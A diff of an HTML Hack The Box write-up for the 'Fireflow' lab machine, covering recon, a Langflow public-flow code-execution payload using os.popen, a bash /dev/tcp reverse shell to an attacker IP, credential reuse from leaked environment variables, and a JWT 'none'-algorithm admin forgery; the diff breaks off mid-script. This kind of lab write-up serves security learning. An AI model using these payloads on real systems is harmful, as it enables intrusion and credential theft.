@@ -2,560 +2,610 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fireflow - HTB Report</title>
     <link rel="stylesheet" href="../style.css">
+    <style>
+      :root {
+        --bg: #0f172a;
+        --panel: #111827;
+        --panel-2: #1f2937;
+        --text: #e5e7eb;
+        --muted: #9ca3af;
+        --accent: #38bdf8;
+        --accent-2: #22c55e;
+        --warn: #f59e0b;
+        --danger: #ef4444;
+        --border: #334155;
+        --code-bg: #020617;
+      }
+      body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        line-height: 1.6;
+      }
+      header {
+        padding: 48px 24px;
+        text-align: center;
+        background: linear-gradient(135deg, #111827 0%, #0f172a 60%, #082f49 100%);
+        border-bottom: 1px solid var(--border);
+      }
+      header h1 {
+        margin: 0;
+        font-size: 2.5rem;
+        letter-spacing: 1px;
+      }
+      header p {
+        color: var(--muted);
+        margin-top: 10px;
+      }
+      main.report {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 32px 20px 64px;
+      }
+      h2 {
+        margin-top: 42px;
+        border-left: 5px solid var(--accent);
+        padding-left: 12px;
+        color: #f8fafc;
+      }
+      h3 {
+        margin-top: 28px;
+        color: #bae6fd;
+      }
+      h4 {
+        color: #bbf7d0;
+      }
+      p, li {
+        color: var(--text);
+      }
+      a {
+        color: var(--accent);
+      }
+      code {
+        background: rgba(2, 6, 23, 0.8);
+        color: #f8fafc;
+        padding: 2px 5px;
+        border-radius: 4px;
+      }
+      pre {
+        background: var(--code-bg);
+        color: #e2e8f0;
+        padding: 16px;
+        border-radius: 10px;
+        overflow-x: auto;
+        border: 1px solid var(--border);
+      }
+      pre code {
+        background: transparent;
+        padding: 0;
+      }
+      .card {
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 14px;
+        padding: 18px;
+        margin: 18px 0;
+      }
+      .callout {
+        background: rgba(56, 189, 248, 0.08);
+        border-left: 4px solid var(--accent);
+        padding: 14px 16px;
+        border-radius: 8px;
+        margin: 18px 0;
+      }
+      .warning {
+        background: rgba(245, 158, 11, 0.08);
+        border-left: 4px solid var(--warn);
+      }
+      .success {
+        background: rgba(34, 197, 94, 0.08);
+        border-left: 4px solid var(--accent-2);
+      }
+      .report-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 18px 0;
+        background: var(--panel);
+        border: 1px solid var(--border);
+      }
+      .report-table th, .report-table td {
+        border: 1px solid var(--border);
+        padding: 10px;
+        text-align: left;
+        vertical-align: top;
+      }
+      .report-table th {
+        background: var(--panel-2);
+        color: #f8fafc;
+      }
+      .phase-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        gap: 14px;
+      }
+      .badge {
+        display: inline-block;
+        padding: 4px 8px;
+        border-radius: 999px;
+        background: #0c4a6e;
+        color: #e0f2fe;
+        font-size: 0.85rem;
+        margin: 2px;
+      }
+      .redacted {
+        color: #fca5a5;
+        font-weight: bold;
+      }
+      footer {
+        margin-top: 40px;
+        color: var(--muted);
+        font-size: 0.95rem;
+      }
+    </style>
   </head>
 
   <body>
     <header>
       <h1>Fireflow</h1>
-      <p>Hack The Box Machine Report</p>
+      <p>Hack The Box Full Pwn Report | Langflow RCE → Credential Reuse → MCP JWT Abuse → Kubernetes Privilege Escalation</p>
     </header>
 
     <main class="report">
+      <section class="card">
+        <h2>Machine Information</h2>
+        <table class="report-table">
+          <tbody>
+            <tr><th>Name</th><td>Fireflow</td></tr>
+            <tr><th>Platform</th><td>Hack The Box</td></tr>
+            <tr><th>Difficulty</th><td>Medium</td></tr>
+            <tr><th>Operating System</th><td>Linux / Ubuntu 24.04.4 LTS</td></tr>
+            <tr><th>Target IP</th><td><code>10.129.22.117</code></td></tr>
+            <tr><th>Hostnames</th><td><code>fireflow.htb</code>, <code>flow.fireflow.htb</code></td></tr>
+            <tr><th>Status</th><td>In Progress - user obtained, root path identified</td></tr>
+            <tr><th>Date Started</th><td>26 June 2026</td></tr>
+          </tbody>
+        </table>
+      </section>
 
-      <h2>Machine Info</h2>
-      <p><strong>Difficulty:</strong> In Progress</p>
-      <p><strong>Operating System:</strong> Linux</p>
-      <p><strong>Status:</strong> In Progress</p>
-      <p><strong>Date Started:</strong> 26 June 2026</p>
-      <p><strong>Date Completed:</strong> In Progress</p>
+      <section>
+        <h2>Executive Summary</h2>
+        <p>
+          Fireflow exposed an HTTPS web application that led to a public Langflow instance on
+          <code>flow.fireflow.htb</code>. The Langflow instance was vulnerable to an unauthenticated
+          code execution path through the public flow build endpoint. This allowed initial command
+          execution as <code>www-data</code> and a reverse shell on the host.
+        </p>
+        <p>
+          Post-exploitation enumeration revealed Langflow environment variables containing a
+          superuser password. That password was reused by the local Linux user <code>nightfall</code>,
+          allowing SSH access and retrieval of the user flag. Further enumeration exposed an MCP AI
+          Tool Registry running behind Kubernetes/NodePort. The MCP service disclosed JWT support
+          for the insecure <code>none</code> algorithm, allowing an unsigned JWT to be forged with
+          <code>role=admin</code>. Admin access allowed registration of MCP tools, leading toward RCE
+          inside the MCP pod and a Kubernetes <code>nodes/proxy</code> abuse path to root.
+        </p>
 
-      <h2>Summary</h2>
-      <p>
-        Fireflow is a Linux machine hosting an HTTPS web application for Task Force Nightfall.
-        Initial enumeration revealed an nginx web server with a wildcard TLS certificate for
-        <code>fireflow.htb</code> and <code>*.fireflow.htb</code>. The main site exposed a link to
-        a Langflow playground on the subdomain <code>flow.fireflow.htb</code>.
-      </p>
+        <div class="phase-grid">
+          <div class="card"><span class="badge">Phase 1</span><h4>Reconnaissance</h4><p>Nmap, vhost discovery, HTTPS enumeration.</p></div>
+          <div class="card"><span class="badge">Phase 2</span><h4>Web Enumeration</h4><p>Langflow discovery, API paths, Gobuster results.</p></div>
+          <div class="card"><span class="badge">Phase 3</span><h4>Initial Access</h4><p>Langflow public flow RCE to <code>www-data</code>.</p></div>
+          <div class="card"><span class="badge">Phase 4</span><h4>Post-Exploitation</h4><p>LinPEAS, leaked environment variables, credential reuse.</p></div>
+          <div class="card"><span class="badge">Phase 5</span><h4>Privilege Escalation</h4><p>MCP JWT <code>alg:none</code> bypass and Kubernetes path.</p></div>
+        </div>
+      </section>
 
-      <p>
-        The attack path began with web enumeration and traffic inspection in the browser. The
-        Langflow playground was found to use a public flow endpoint under
-        <code>/api/v1/build_public_tmp/</code>. By copying and modifying the request payload, I was
-        able to replace the Python code inside the <code>TextOperations</code> component and obtain
-        remote code execution as <code>www-data</code>. This was then converted into a reverse shell.
-      </p>
+      <section>
+        <h2>Phase 1: Reconnaissance</h2>
+        <h3>Initial Nmap Scan</h3>
+        <pre><code>nmap 10.129.22.117 -oA Nmap/initial</code></pre>
+        <table class="report-table">
+          <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>22/tcp</td><td>Open</td><td>SSH</td><td>OpenSSH exposed.</td></tr>
+            <tr><td>443/tcp</td><td>Open</td><td>HTTPS</td><td>nginx web server.</td></tr>
+            <tr><td>9100/tcp</td><td>Filtered</td><td>JetDirect / node-exporter candidate</td><td>Later relevant to monitoring/Kubernetes.</td></tr>
+            <tr><td>30000/tcp</td><td>Filtered</td><td>NodePort range</td><td>Possible Kubernetes NodePort exposure.</td></tr>
+            <tr><td>30718/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
+            <tr><td>30951/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
+            <tr><td>31038/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
+            <tr><td>31337/tcp</td><td>Filtered</td><td>Elite</td><td>High filtered port.</td></tr>
+          </tbody>
+        </table>
 
-      <p>
-        Post-exploitation enumeration revealed Langflow application data in
-        <code>/var/lib/langflow</code>, including <code>langflow.db</code>, a <code>secret_key</code> file,
-        and an MCP server configuration. Local service enumeration also showed Kubernetes-related
-        services listening on localhost, including the Kubernetes API server on port
-        <code>6443</code> and kubelet-related ports.
-      </p>
+        <h3>Service Version Scan</h3>
+        <pre><code>nmap -sC -sV -p 22,443,9100,30000,30718,30951,31038,31337 10.129.22.117 -oA Nmap/full</code></pre>
+        <p>
+          The HTTPS certificate identified <code>fireflow.htb</code> and wildcard subdomains
+          under <code>*.fireflow.htb</code>. This led to vhost enumeration and the addition of
+          <code>fireflow.htb</code> and <code>flow.fireflow.htb</code> to <code>/etc/hosts</code>.
+        </p>
+        <pre><code>echo "10.129.22.117 fireflow.htb" | sudo tee -a /etc/hosts
+echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
+      </section>
 
-      <h2>Reconnaissance</h2>
-
-      <h3>Basic Nmap Scan</h3>
-      <pre><code>nmap 10.129.22.117 -oA Nmap/initial</code></pre>
-
-      <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-26 19:47 PDT
-Nmap scan report for 10.129.22.117
-Host is up (0.087s latency).
-Not shown: 992 closed tcp ports (conn-refused)
-PORT      STATE    SERVICE
-22/tcp    open     ssh
-443/tcp   open     https
-9100/tcp  filtered jetdirect
-30000/tcp filtered ndmps
-30718/tcp filtered unknown
-30951/tcp filtered unknown
-31038/tcp filtered unknown
-31337/tcp filtered Elite</code></pre>
-
-      <h3>Full Nmap Scan</h3>
-      <pre><code>nmap -sC -sV -p 22,443,9100,30000,30718,30951,31038,31337 10.129.22.117 -oA Nmap/full</code></pre>
-
-      <pre><code>PORT      STATE    SERVICE   VERSION
-22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-443/tcp   open     ssl/http  nginx
-|_http-title: Did not follow redirect to https://fireflow.htb/
-| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
-| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
-| Not valid before: 2026-04-14T16:35:31
-|_Not valid after:  2028-07-17T16:35:31
-9100/tcp  filtered jetdirect
-30000/tcp filtered ndmps
-30718/tcp filtered unknown
-30951/tcp filtered unknown
-31038/tcp filtered unknown
-31337/tcp filtered Elite</code></pre>
-
-      <h3>Open Ports</h3>
-      <table class="report-table">
-        <thead>
-          <tr>
-            <th>Port</th>
-            <th>Service</th>
-            <th>Notes</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>22</td>
-            <td>SSH</td>
-            <td>OpenSSH 9.6p1 on Ubuntu. Password authentication was enabled but no valid credentials were available.</td>
-          </tr>
-          <tr>
-            <td>443</td>
-            <td>HTTPS</td>
-            <td>nginx web server using a self-signed certificate for <code>fireflow.htb</code> and <code>*.fireflow.htb</code>.</td>
-          </tr>
-          <tr>
-            <td>9100</td>
-            <td>Filtered</td>
-            <td>Likely metrics-related service based on later local enumeration.</td>
-          </tr>
-          <tr>
-            <td>30000, 30718, 30951, 31038, 31337</td>
-            <td>Filtered</td>
-            <td>Filtered high ports. Later local enumeration suggested Kubernetes-related services are present on the host.</td>
-          </tr>
-        </tbody>
-      </table>
-
-      <h2>Service Enumeration</h2>
-
-      <h3>SSH</h3>
-      <p>
-        SSH was reachable on port 22, but no valid credentials were available during initial enumeration.
-      </p>
-
-      <pre><code>ssh 10.129.22.117</code></pre>
-
-      <pre><code>netswipe@10.129.22.117's password:
-Permission denied, please try again.
-netswipe@10.129.22.117: Permission denied (publickey,password).</code></pre>
-
-      <h3>HTTPS Hostname Setup</h3>
-      <p>
-        The TLS certificate and web redirect indicated that the hostname <code>fireflow.htb</code>
-        should be added to <code>/etc/hosts</code>.
-      </p>
-
-      <pre><code>echo "10.129.22.117 fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
-
-      <h3>Self-Signed Certificate</h3>
-      <p>
-        Curl initially failed because the site used a self-signed certificate. I learned to use
-        <code>-k</code> with curl to ignore certificate validation in this HTB lab context.
-      </p>
-
-      <pre><code>curl -k -I https://fireflow.htb</code></pre>
-
-      <pre><code>HTTP/1.1 200 OK
+      <section>
+        <h2>Phase 2: Web and Service Enumeration</h2>
+        <h3>HTTPS Certificate Handling</h3>
+        <p>
+          Initial <code>curl</code> requests failed because the certificate was self-signed.
+          The <code>-k</code> flag was used to ignore certificate validation during lab testing.
+        </p>
+        <pre><code>curl -k -I https://fireflow.htb</code></pre>
+        <pre><code>HTTP/1.1 200 OK
 Server: nginx
-Content-Type: text/html
-Content-Length: 12913
 X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
 X-Content-Type-Options: nosniff
 Referrer-Policy: strict-origin-when-cross-origin</code></pre>
 
-      <h3>Directory Enumeration Issue</h3>
-      <p>
-        Initial Gobuster enumeration failed because TLS certificate validation was not disabled.
-        This was another reminder to use <code>-k</code> when testing self-signed HTTPS services.
-      </p>
+        <h3>Front-End Discovery</h3>
+        <p>
+          The main page identified the organization as Task Force Nightfall and exposed a public AI
+          playground link on the <code>flow.fireflow.htb</code> subdomain.
+        </p>
+        <table class="report-table">
+          <thead><tr><th>Finding</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Subdomain</td><td><code>flow.fireflow.htb</code></td></tr>
+            <tr><td>Path</td><td><code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></td></tr>
+            <tr><td>Email</td><td><code>ops@fireflow.htb</code></td></tr>
+            <tr><td>Technology</td><td>Langflow / Flow engine <code>1.8.2</code></td></tr>
+            <tr><td>Feature</td><td>MCP Tool Registry references</td></tr>
+          </tbody>
+        </table>
 
-      <pre><code>gobuster dir -u https://fireflow.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+        <h3>WhatWeb Fingerprinting</h3>
+        <pre><code>whatweb https://fireflow.htb
+whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
+        <p>
+          The <code>flow.fireflow.htb</code> application returned the title <code>Langflow</code>,
+          confirming the exposed AI workflow builder.
+        </p>
 
-      <pre><code>Error: error on running gobuster: unable to connect to https://fireflow.htb/:
-tls: failed to verify certificate: x509: certificate signed by unknown authority</code></pre>
+        <h3>Directory Enumeration</h3>
+        <pre><code>gobuster dir -u https://flow.fireflow.htb \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -k -x php,txt,html,js,json --exclude-length 1142 -t 50</code></pre>
+        <table class="report-table">
+          <thead><tr><th>Path</th><th>Status</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td><code>/docs</code></td><td>200</td><td>FastAPI Swagger documentation.</td></tr>
+            <tr><td><code>/redoc</code></td><td>200</td><td>ReDoc API documentation.</td></tr>
+            <tr><td><code>/health</code></td><td>200</td><td>Application health check.</td></tr>
+            <tr><td><code>/logs</code></td><td>403</td><td>Restricted logs endpoint exists.</td></tr>
+            <tr><td><code>/manifest.json</code></td><td>200</td><td>Web application manifest.</td></tr>
+          </tbody>
+        </table>
+        <p>Enumeration of <code>fireflow.htb</code> only revealed <code>/index.html</code>.</p>
+      </section>
 
-      <h2>Web Enumeration</h2>
+      <section>
+        <h2>Phase 3: Initial Access - Langflow RCE</h2>
+        <h3>Vulnerability Summary</h3>
+        <p>
+          Langflow <code>1.8.2</code> was vulnerable to an unauthenticated code execution issue in
+          the public temporary flow build endpoint. The application accepted attacker-controlled
+          flow JSON data and executed Python component code during flow construction.
+        </p>
+        <div class="callout">
+          <strong>Key Endpoint:</strong>
+          <code>/api/v1/build_public_tmp/&lt;flow_id&gt;/flow</code>
+        </div>
 
-      <h3>Main Page Findings</h3>
-      <p>
-        Reviewing the main page source revealed several useful clues:
-      </p>
-
-      <ul>
-        <li><code>flow.fireflow.htb</code> subdomain</li>
-        <li><code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code> Langflow playground path</li>
-        <li><code>ops@fireflow.htb</code> email address</li>
-        <li>Flow engine version <code>1.8.2</code></li>
-        <li>MCP Tool Registry reference</li>
-      </ul>
-
-      <h3>WhatWeb</h3>
-      <pre><code>whatweb https://fireflow.htb</code></pre>
-
-      <pre><code>https://fireflow.htb [200 OK] Email[ops@fireflow.htb], HTML5,
-HTTPServer[nginx], IP[10.129.22.117], Title[FireFlow — Task Force Nightfall],
-X-Frame-Options[ALLOW-FROM https://flow.fireflow.htb], nginx</code></pre>
-
-      <h3>Subdomain Setup</h3>
-      <p>
-        The wildcard certificate and page source both pointed to <code>flow.fireflow.htb</code>.
-      </p>
-
-      <pre><code>echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
-
-      <h3>Langflow Playground</h3>
-      <p>
-        Visiting the playground URL revealed a Langflow AI chat interface.
-      </p>
-
-      <pre><code>https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
-
-      <pre><code>curl -k -I https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
-
-      <pre><code>HTTP/1.1 200 OK
-Server: nginx
-Content-Type: text/html; charset=utf-8
-Content-Length: 1142
-Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;</code></pre>
-
-      <pre><code>whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
-
-      <pre><code>https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 [200 OK]
-HTML5, HTTPServer[nginx], Script[module], Title[Langflow], nginx</code></pre>
-
-      <h2>Langflow Request Analysis</h2>
-
-      <h3>Browser Network Inspection</h3>
-      <p>
-        In the browser developer tools, the Langflow playground generated a POST request to the
-        public temporary build endpoint. The important endpoint was:
-      </p>
-
-      <pre><code>/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?start_component_id=ChatInput-608En&amp;log_builds=false&amp;event_delivery=streaming</code></pre>
-
-      <p>
-        The response returned a <code>job_id</code>, which could then be used with the corresponding
-        <code>/events</code> endpoint to retrieve the flow output.
-      </p>
-
-      <pre><code>POST /api/v1/build_public_tmp/&lt;flow_id&gt;/flow  → returns job_id
-GET  /api/v1/build_public_tmp/&lt;job_id&gt;/events → returns output/events</code></pre>
-
-      <h3>Flow Structure</h3>
-      <p>
-        The copied request payload showed the Langflow graph structure:
-      </p>
-
-      <pre><code>ChatInput-608En → TextOperations-yvwhG → ChatOutput-gfxpD</code></pre>
-
-      <p>
-        The <code>TextOperations-yvwhG</code> node was responsible for replacing all user input with
-        a canned response. Its configuration used a regex search pattern that matched everything.
-      </p>
-
-      <pre><code>operation: Text Replace
-search_pattern: ^.*$
-use_regex: true
-replacement_text: We are extremely sorry, this is still under development. Please, check back soon...</code></pre>
-
-      <h2>Initial Access</h2>
-
-      <h3>Manual Payload Modification</h3>
-      <p>
-        The request payload contained the Python code for the <code>TextOperations</code> component.
-        By modifying the <code>get_message()</code> method inside the component code, I was able to
-        make the server execute a system command and return the output in the Langflow response.
-      </p>
-
-      <p>The original method looked like this:</p>
-
-      <pre><code>def get_message(self) -&gt; Message:
-    """Return result as simple message with the processed text."""
-    result = self.process_text()
-    return Message(text=self._format_result_as_text(result))</code></pre>
-
-      <p>The modified proof-of-execution method used <code>os.popen()</code>:</p>
-
-      <pre><code>def get_message(self) -&gt; Message:
+        <h3>Manual Exploitation</h3>
+        <p>
+          The browser request to the public playground was captured and modified. The flow contained
+          a <code>TextOperations-yvwhG</code> node whose Python code was modified so that the
+          final <code>get_message()</code> method executed shell commands using Python.
+        </p>
+        <pre><code>def get_message(self) -&gt; Message:
     import os
     return Message(text=os.popen("id").read())</code></pre>
+        <p>The first proof of execution returned:</p>
+        <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 
-      <h3>Proof of Remote Code Execution</h3>
-      <p>
-        After posting the modified flow payload and fetching the job events, the server returned
-        command output showing that code execution was achieved as <code>www-data</code>.
-      </p>
+        <h3>Reverse Shell</h3>
+        <p>
+          A Bash reverse shell was triggered through the modified Langflow component and caught on
+          the attacker machine. This produced a shell as <code>www-data</code> in
+          <code>/var/lib/langflow</code>.
+        </p>
+        <pre><code>nc -lvnp 4444
 
-      <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
-
-      <p>
-        Additional command execution confirmed the hostname and working directory:
-      </p>
-
-      <pre><code>whoami; hostname; pwd</code></pre>
-
-      <pre><code>www-data
+# Triggered command through Langflow
+bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.209/4444 0&gt;&amp;1"</code></pre>
+        <pre><code>www-data@fireflow:/var/lib/langflow$ whoami
+www-data
+www-data@fireflow:/var/lib/langflow$ hostname
 fireflow
+www-data@fireflow:/var/lib/langflow$ pwd
 /var/lib/langflow</code></pre>
+      </section>
 
-      <h3>Automation Script</h3>
-      <p>
-        To make command execution easier, I created a helper script named <code>runflow.py</code>.
-        The script updates <code>flow.json</code>, replaces the command inside the
-        <code>get_message()</code> method, posts the modified flow, and prints the job ID for manual
-        event fetching.
-      </p>
-
-      <pre><code>./runflow.py 'id'
-./runflow.py 'whoami; hostname; pwd'</code></pre>
-
-      <p>
-        The key lesson was that the <code>flow_id</code> remains stable, but each POST creates a new
-        <code>job_id</code>.
-      </p>
-
-      <pre><code>Flow ID = which flow to run
-Job ID  = this specific run's result</code></pre>
-
-      <h3>Reverse Shell</h3>
-      <p>
-        After proving command execution, I used the same payload location to trigger a Bash reverse
-        shell back to my VPN IP address.
-      </p>
-
-      <p>Listener:</p>
-      <pre><code>nc -lvnp 4444</code></pre>
-
-      <p>Payload:</p>
-      <pre><code>./runflow.py 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.209/4444 0&gt;&amp;1"'</code></pre>
-
-      <p>The listener received a shell:</p>
-
-      <pre><code>Connection received on 10.129.22.117 52696
-bash: cannot set terminal process group (1530): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@fireflow:/var/lib/langflow$</code></pre>
-
-      <h2>Post-Exploitation Enumeration</h2>
-
-      <h3>Current User</h3>
-      <pre><code>whoami
-hostname
-pwd</code></pre>
-
-      <pre><code>www-data
-fireflow
-/var/lib/langflow</code></pre>
-
-      <h3>Home Directory</h3>
-      <p>
-        The <code>/home</code> directory contained a user named <code>nightfall</code>, but
-        <code>www-data</code> did not have permission to enter the directory.
-      </p>
-
-      <pre><code>cd /home
-ls
-cd nightfall</code></pre>
-
-      <pre><code>nightfall
-bash: cd: nightfall: Permission denied</code></pre>
-
-      <h3>Langflow Application Data</h3>
-      <p>
-        The Langflow working directory contained several interesting files and directories.
-      </p>
-
-      <pre><code>ls /var/lib/langflow</code></pre>
-
-      <pre><code>ba4fe756-d6f7-4c7a-a7b1-f986206878ec
+      <section>
+        <h2>Phase 4: Post-Exploitation and Credential Reuse</h2>
+        <h3>Langflow Files</h3>
+        <p>
+          The Langflow configuration directory contained a database, profile picture directory,
+          project-specific data, and a secret key.
+        </p>
+        <pre><code>ls -la /var/lib/langflow
+ba4fe756-d6f7-4c7a-a7b1-f986206878ec
 langflow.db
 profile_pictures
 secret_key</code></pre>
 
-      <p>
-        The <code>secret_key</code> file contained a Langflow secret value. The value was recorded
-        locally but should be redacted in public notes.
-      </p>
+        <h3>LinPEAS / Environment Variables</h3>
+        <p>
+          LinPEAS exposed environment variables for the Langflow process. These contained the
+          Langflow superuser account and password. The report redacts the password value, but the
+          original value strongly hinted at the local user <code>nightfall</code>.
+        </p>
+        <pre><code>LANGFLOW_AUTO_LOGIN=False
+LANGFLOW_CONFIG_DIR=/var/lib/langflow
+LANGFLOW_SECRET_KEY=&lt;redacted&gt;
+LANGFLOW_SUPERUSER=langflow
+LANGFLOW_SUPERUSER_PASSWORD=&lt;redacted&gt;</code></pre>
 
-      <pre><code>cat /var/lib/langflow/secret_key
-REDACTED</code></pre>
+        <h3>SSH Pivot to nightfall</h3>
+        <p>
+          The Langflow superuser password was reused for the local Linux account
+          <code>nightfall</code>. SSH login succeeded and the user flag was retrieved.
+        </p>
+        <pre><code>ssh nightfall@10.129.22.117
+cat user.txt</code></pre>
+        <pre><code>user.txt: <span class="redacted">REDACTED</span></code></pre>
 
-      <h3>MCP Server Configuration</h3>
-      <p>
-        Searching the Langflow directory revealed an MCP server configuration file pointing to a
-        local Langflow MCP endpoint.
-      </p>
+        <h3>Failed Sudo CVE Path</h3>
+        <p>
+          Sudo version <code>1.9.15p5</code> appeared potentially vulnerable to
+          CVE-2025-32463, but exploitation using the tested <code>sudo-chwoot.sh</code> path failed
+          because the user was not permitted to use the <code>-R</code> chroot option.
+        </p>
+        <pre><code>sudo -l
+Sorry, user nightfall may not run sudo on fireflow.
 
-      <pre><code>grep -RniE 'nightfall|password|passwd|secret|token|api|key|ssh|credential' /var/lib/langflow 2&gt;/dev/null | head -100</code></pre>
+sudo -V
+Sudo version 1.9.15p5
 
-      <pre><code>/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec/_mcp_servers_ba4fe756-d6f7-4c7a-a7b1-f986206878ec.json:1:
-{"mcpServers":{"lf-starter_project":{"command":"uvx","args":["mcp-proxy","--transport","streamablehttp","http://127.0.0.1:7860/api/v1/mcp/project/62e121b7-b863-48a5-a69d-d5b48a0afa84/streamable"]}}}</code></pre>
+./sudo-chwoot.sh
+sudo: you are not permitted to use the -R option with woot</code></pre>
+      </section>
 
-      <p>
-        Querying the endpoint showed that it existed but required an API key.
-      </p>
-
-      <pre><code>curl -s http://127.0.0.1:7860/api/v1/mcp/project/62e121b7-b863-48a5-a69d-d5b48a0afa84/streamable</code></pre>
-
-      <pre><code>{"detail":"API key required for this project. Provide x-api-key header or query parameter."}</code></pre>
-
-      <h3>Local Service Enumeration</h3>
-      <p>
-        Running <code>ss</code> revealed multiple local services, including Langflow and Kubernetes
-        components.
-      </p>
-
-      <pre><code>ss -tulpen</code></pre>
-
-      <table class="report-table">
-        <thead>
-          <tr>
-            <th>Address</th>
-            <th>Port</th>
-            <th>Likely Service</th>
-            <th>Notes</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>127.0.0.1</td>
-            <td>7860</td>
-            <td>Langflow</td>
-            <td>Python process hosting local Langflow API.</td>
-          </tr>
-          <tr>
-            <td>0.0.0.0</td>
-            <td>443</td>
-            <td>nginx</td>
-            <td>Public HTTPS reverse proxy.</td>
-          </tr>
-          <tr>
-            <td>0.0.0.0 / ::</td>
-            <td>22</td>
-            <td>SSH</td>
-            <td>Remote login service.</td>
-          </tr>
-          <tr>
-            <td>*</td>
-            <td>6443</td>
-            <td>Kubernetes API Server</td>
-            <td>Returned 401 Unauthorized without credentials.</td>
-          </tr>
-          <tr>
-            <td>*</td>
-            <td>10250</td>
-            <td>Kubelet</td>
-            <td>Returned Unauthorized.</td>
-          </tr>
-          <tr>
-            <td>127.0.0.1</td>
-            <td>10248</td>
-            <td>Kubelet Health</td>
-            <td>Returned <code>ok</code>.</td>
-          </tr>
-          <tr>
-            <td>127.0.0.1</td>
-            <td>10256</td>
-            <td>Kube Proxy Health</td>
-            <td>Returned healthy status JSON.</td>
-          </tr>
-          <tr>
-            <td>*</td>
-            <td>9100</td>
-            <td>Metrics</td>
-            <td>Likely node exporter or metrics endpoint.</td>
-          </tr>
-        </tbody>
-      </table>
-
-      <h3>Kubernetes Checks</h3>
-      <p>
-        The Kubernetes API server and kubelet were reachable locally but required authentication.
-      </p>
-
-      <pre><code>curl -k -s https://127.0.0.1:6443/version</code></pre>
-
-      <pre><code>{
-  "kind": "Status",
-  "apiVersion": "v1",
-  "metadata": {},
-  "status": "Failure",
-  "message": "Unauthorized",
-  "reason": "Unauthorized",
-  "code": 401
+      <section>
+        <h2>Phase 5: MCP AI Tool Registry Enumeration</h2>
+        <h3>Hidden MCP Config</h3>
+        <p>
+          As <code>nightfall</code>, a hidden MCP configuration file was found in the user's home
+          directory. It contained credentials for a service account named <code>langflow-bot</code>
+          and pointed to an MCP service on port <code>30080</code>.
+        </p>
+        <pre><code>cat ~/.mcp/config.json
+{
+  "server": "http://10.129.22.117:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "&lt;redacted&gt;"
 }</code></pre>
 
-      <pre><code>curl -k -s https://127.0.0.1:10250/pods</code></pre>
+        <h3>MCP Version Endpoint</h3>
+        <pre><code>curl -i -u 'langflow-bot:&lt;redacted&gt;' http://127.0.0.1:30080/api/v1/version</code></pre>
+        <pre><code>{
+  "service": "MCP AI Tool Registry",
+  "version": "0.1.0",
+  "auth": {
+    "type": "JWT",
+    "header": "Authorization: Bearer &lt;token&gt;",
+    "supported_algorithms": ["HS256", "none"]
+  },
+  "docs": "/docs",
+  "endpoints": [
+    "POST /mcp [MCP JSON-RPC 2.0]",
+    "POST /api/v1/auth",
+    "GET /api/v1/tools",
+    "POST /api/v1/tools [admin]"
+  ]
+}</code></pre>
 
-      <pre><code>Unauthorized</code></pre>
+        <h3>Normal Authentication</h3>
+        <p>
+          Authentication with the MCP credentials returned a standard HS256 JWT with
+          <code>role=user</code>.
+        </p>
+        <pre><code>curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"langflow-bot","password":"&lt;redacted&gt;"}'</code></pre>
+        <pre><code>{"access_token":"&lt;JWT with role=user&gt;","token_type":"bearer"}</code></pre>
 
-      <p>
-        Health endpoints were accessible:
-      </p>
+        <h3>JWT none Algorithm Bypass</h3>
+        <p>
+          Since the service advertised support for <code>none</code>, an unsigned JWT was forged
+          with <code>role=admin</code>. The admin-only tool registration endpoint returned
+          validation errors instead of <code>401</code> or <code>403</code>, proving authorization was
+          bypassed.
+        </p>
+        <pre><code>ADMIN_TOKEN=$(python3 - &lt;&lt;'PY'
